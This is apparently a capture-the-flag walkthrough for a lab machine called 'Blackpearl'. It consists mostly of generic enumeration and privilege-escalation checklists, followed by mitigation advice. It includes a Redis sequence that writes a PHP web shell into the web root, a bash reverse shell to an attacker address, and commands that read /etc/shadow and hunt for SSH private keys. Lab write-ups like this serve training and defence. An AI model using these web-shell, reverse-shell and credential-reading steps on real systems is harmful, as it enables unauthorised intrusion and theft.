# Blackpearl Walkthrough

## Overview
The "Blackpearl" machine is a complex multi-stage target that combines various vulnerabilities and requires multiple exploitation techniques to fully compromise. This walkthrough covers the complete process of enumerating, exploiting, and escalating privileges on this challenging system.

## Reconnaissance and Enumeration

### Initial Nmap Scan
```bash
nmap -sV -sC -p- --min-rate 5000 <target_ip>
```

**Key findings:**
- Port 22: SSH
- Port 53: DNS
- Port 80: HTTP (Apache)
- Port 443: HTTPS
- Port 6379: Redis
- Port 8080: HTTP (Alternative web service)
- Additional service ports may be discovered

### Web Application Enumeration

1. **Directory enumeration**:
   ```bash
   gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
   ```

2. **Virtual host discovery**:
   ```bash
   gobuster vhost -u http://<target_ip> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   ```

3. **Nikto scan**:
   ```bash
   nikto -h http://<target_ip>
   ```

### Service Enumeration

1. **Redis enumeration**:
   ```bash
   redis-cli -h <target_ip> info
   ```

2. **DNS enumeration**:
   ```bash
   dig axfr @<target_ip>
   dnsrecon -d <domain> -t axfr -n <target_ip>
   ```

## Vulnerability Analysis

### Web Application Vulnerabilities

1. **Check for common vulnerabilities**:
   - SQL injection
   - Command injection
   - File upload vulnerabilities
   - Authentication bypass

2. **Investigate discovered directories and endpoints**:
   - Look for admin panels
   - Check for exposed configuration files
   - Look for development/backup files

### Redis Vulnerabilities

1. **Check authentication requirements**:
   - Attempt to connect without authentication
   - Check for default credentials

2. **Check redis version for known vulnerabilities**:
   - Research CVEs for the specific version

### Additional Service Vulnerabilities

1. **Analyze all discovered services for vulnerabilities**
2. **Check for misconfigurations in service settings**
3. **Review any identified versions for known exploits**

## Initial Exploitation

### Method 1: Web Application Exploitation

1. **Identify exploitable vulnerability**:
   - Examples: SQL injection, file upload, LFI/RFI

2. **Gain initial shell access**:
   - Upload webshell if file upload is available
   - Inject command if command injection is found
   - Set up reverse shell

### Method 2: Redis Exploitation

1. **If Redis is unprotected**:
   ```bash
   # Connect to Redis
   redis-cli -h <target_ip>
   
   # Check if we can write files
   config set dir /var/www/html/
   config set dbfilename shell.php
   set test "<?php system($_GET['cmd']); ?>"
   save
   ```

2. **Access the web shell**:
   ```
   http://<target_ip>/shell.php?cmd=id
   ```

3. **Upgrade to reverse shell**:
   ```
   http://<target_ip>/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/<your_ip>/4444 0>%261'
   ```

## Lateral Movement

### User Enumeration

1. **Enumerate local users**:
   ```bash
   cat /etc/passwd | grep -v nologin
   ls -la /home/
   ```

2. **Check for sensitive files**:
   ```bash
   find / -name "*.txt" -o -name "*.conf" -o -name "*.config" -type f 2>/dev/null
   ```

3. **Check for password files or credentials**:
   ```bash
   grep -r "password" /var/www/ 2>/dev/null
   grep -r "PASSWORD" /var/www/ 2>/dev/null
   ```

### Lateral Movement Methods

1. **SSH key discovery**:
   - Check for readable .ssh directories
   - Look for private keys in unusual locations

2. **Password reuse**:
   - Try found credentials with other users
   - Check common locations for stored passwords

3. **Configuration files**:
   - Examine application config files for credentials
   - Look for database connection strings

## Privilege Escalation

### Basic Enumeration

1. **Check current user privileges**:
   ```bash
   id
   sudo -l
   ```

2. **Automated enumeration**:
   ```bash
   # LinPEAS
   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

### Privilege Escalation Vectors

1. **SUID binaries**:
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Sudo rights**:
   ```bash
   sudo -l
   ```

3. **Cron jobs**:
   ```bash
   cat /etc/crontab
   ls -la /etc/cron*
   ```

4. **Kernel exploits**:
   ```bash
   uname -a
   # Research kernel version for exploits
   ```

5. **Service exploits**:
   - Look for services running as root
   - Check for vulnerable versions of running services

### Root Access

1. **Exploit identified privilege escalation vector**:
   - Based on findings, implement appropriate technique
   - Examples:
     - Exploiting sudo rights
     - Leveraging SUID binaries
     - Exploiting writeable cron jobs

2. **Verify root access**:
   ```bash
   id
   whoami
   ```

## Capturing Flags

1. **User flags**:
   ```bash
   find / -name user.txt 2>/dev/null
   # Check various user home directories for flags
   ```

2. **Root flag**:
   ```bash
   find / -name root.txt 2>/dev/null
   cat /root/root.txt
   ```

## Post-Exploitation

1. **Gather sensitive information**:
   ```bash
   cat /etc/shadow
   find / -name id_rsa 2>/dev/null
   ```

2. **Network enumeration**:
   ```bash
   netstat -tuln
   ip a
   cat /etc/hosts
   ```

3. **Additional user enumeration**:
   ```bash
   ls -la /home/*/
   find /home -type f -name "*.txt" -o -name "*.conf" 2>/dev/null
   ```

## Multi-stage Attack Summary

1. **Initial Access**: 
   - Web application vulnerability or Redis exploitation

2. **Lateral Movement**:
   - Credential discovery
   - SSH private key usage
   - Password reuse

3. **Privilege Escalation**:
   - SUID binary, sudo rights, or service misconfiguration

4. **Complete Compromise**:
   - Root access achieved
   - All flags captured

## Mitigation Recommendations

If this were a real engagement, recommend:

1. **Web Application Security**:
   - Implement proper input validation
   - Use prepared statements for database queries
   - Restrict file upload functionality

2. **Service Hardening**:
   - Secure Redis with authentication
   - Disable unnecessary services
   - Use least privilege principle for service accounts

3. **System Security**:
   - Implement regular patching
   - Audit SUID binaries and sudo permissions
   - Review cron jobs for security issues

4. **Network Security**:
   - Implement proper network segmentation
   - Restrict access to internal services
   - Use firewall rules to limit exposure

5. **Credential Management**:
   - Implement strong password policies
   - Avoid password reuse
   - Secure storage of configuration files

## Lessons Learned

- Complex systems require thorough enumeration of all services
- Multiple attack vectors often exist in real-world systems
- Privilege escalation often relies on overlooked misconfigurations
- Sensitive information may be scattered throughout the system
- Systematic approach is essential for complex penetration tests
